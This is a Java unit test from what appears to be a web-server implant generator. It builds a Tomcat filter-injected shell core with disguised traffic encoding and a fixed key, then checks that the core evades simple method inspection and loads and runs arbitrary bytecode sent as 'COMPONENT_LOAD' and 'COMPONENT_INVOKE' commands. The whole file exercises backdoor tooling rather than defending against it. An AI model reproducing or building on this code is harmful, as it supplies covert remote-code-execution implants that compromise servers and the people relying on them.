package org.leo.jmg;

import org.junit.jupiter.api.Test;
import org.leo.core.entity.Disguise;
import org.leo.core.payload.PayloadCodec;
import org.leo.jmg.core.LeoCore;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class CoreInvocationHandlerEntryTest {

    @Test
    void generatedCoreUsesInvocationHandlerForPayloadProcessing() throws Exception {
        Disguise request = trafficDisguise(false);
        Disguise response = trafficDisguise(true);
        ShellGeneratorConfig config = ShellGeneratorConfig.builder(request, response)
                .coreClassName("org.example.InvocationHandlerCore")
                .shellClassName("org.example.InvocationHandlerShell")
                .injectorClassName("org.example.InvocationHandlerInjector")
                .header("X-Test", "invocation-handler")
                .serverType("Tomcat")
                .shellType("FilterInjector")
                .packerType("DefaultBase64")
                .build();

        byte[] bytecode = new LeoCore(request, response, "54ikun")
                .genLeoCoreByClassName(config.getCoreClassName(), config);
        Class<?> coreType = new ByteArrayClassLoader().define(bytecode);
        Object coreInstance = coreType.getDeclaredConstructor().newInstance();

        assertTrue(InvocationHandler.class.isAssignableFrom(coreType));
        assertFalse(hasDeclaredMethod(coreType, "decode"));
        assertFalse(hasDeclaredMethod(coreType, "encode"));
        assertFalse(hasDeclaredMethod(coreType, "processBuffer"));

        Map<String, Object> requestPayload = new HashMap<>();
        requestPayload.put("requestId", "request-1");
        requestPayload.put("operation", "PING");
        requestPayload.put("params", new HashMap<>());

        ByteArrayOutputStream wire = new ByteArrayOutputStream();
        wire.write(new PayloadCodec("54ikun").encode(requestPayload));
        try {
            ((InvocationHandler) coreInstance).invoke(null, null, new Object[]{wire});
        } catch (Throwable e) {
            throw new AssertionError("Core invocation failed", e);
        }

        Map<String, Object> responsePayload = new PayloadCodec("54ikun")
                .decode(wire.toByteArray());
        assertEquals("request-1", responsePayload.get("requestId"));
        assertEquals(200, responsePayload.get("code"));
        assertTrue(responsePayload.get("data") instanceof Map<?, ?>);

        String componentName = "ChannelComponent";
        Map<String, Object> load = new HashMap<>();
        load.put("requestId", "request-2");
        load.put("operation", "COMPONENT_LOAD");
        load.put("hostId", ((Map<?, ?>) responsePayload.get("data")).get("hostId"));
        load.put("component", componentName);
        Map<String, Object> loadParams = new HashMap<>();
        loadParams.put("bytecode", componentBytecode());
        load.put("params", loadParams);
        Map<String, Object> loadResponse = invokePayload(coreInstance, load);
        assertEquals(200, loadResponse.get("code"));

        Map<String, Object> invoke = new HashMap<>();
        invoke.put("requestId", "request-3");
        invoke.put("operation", "COMPONENT_INVOKE");
        invoke.put("hostId", ((Map<?, ?>) responsePayload.get("data")).get("hostId"));
        invoke.put("component", componentName);
        invoke.put("action", "run");
        invoke.put("params", new HashMap<>());
        Map<String, Object> invokeResponse = invokePayload(coreInstance, invoke);
        assertEquals(200, invokeResponse.get("code"));
        assertEquals("component-channel-ok", ((Map<?, ?>) invokeResponse.get("data")).get("marker"));
    }

    @SuppressWarnings("unchecked")
    private static Map<String, Object> invokePayload(Object core, Map<String, Object> request) throws Exception {
        ByteArrayOutputStream wire = new ByteArrayOutputStream();
        wire.write(new PayloadCodec("54ikun").encode(request));
        try {
            ((InvocationHandler) core).invoke(null, null, new Object[]{wire});
        } catch (Throwable error) {
            throw new AssertionError("Core invocation failed", error);
        }
        return (Map<String, Object>) new PayloadCodec("54ikun").decode(wire.toByteArray());
    }

    private static byte[] componentBytecode() throws Exception {
        String resource = CoreInvocationHandlerEntryTest.class.getName().replace('.', '/')
                + "$ChannelComponent.class";
        InputStream input = CoreInvocationHandlerEntryTest.class.getClassLoader()
                .getResourceAsStream(resource);
        if (input == null) throw new IllegalStateException("missing component test bytecode");
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int count;
        while ((count = input.read(buffer)) != -1) output.write(buffer, 0, count);
        input.close();
        return output.toByteArray();
    }

    public static class ChannelComponent implements Runnable {
        public void run() {
            InvocationHandler handler = (InvocationHandler) Thread.currentThread().getContextClassLoader();
            Map<String, Object> results = new HashMap<>();
            results.put("code", Integer.valueOf(200));
            results.put("marker", "component-channel-ok");
            try {
                handler.invoke(null, null, new Object[]{results});
            } catch (Throwable error) {
                throw new IllegalStateException(error);
            }
        }
    }

    private static Disguise trafficDisguise(boolean response) {
        Disguise disguise = new Disguise();
        if (response) {
            disguise.setTrafficEncodeBody(
                    "public byte[] encodeTraffic(byte[] data) { return data; }");
        } else {
            disguise.setTrafficDecodeBody(
                    "public byte[] decodeTraffic(byte[] data) { return data; }");
        }
        return disguise;
    }

    private static boolean hasDeclaredMethod(Class<?> type, String name) {
        for (Method method : type.getDeclaredMethods()) {
            if (name.equals(method.getName())) return true;
        }
        return false;
    }

    private static final class ByteArrayClassLoader extends ClassLoader {
        private Class<?> define(byte[] bytes) {
            return defineClass(null, bytes, 0, bytes.length);
        }
    }
}
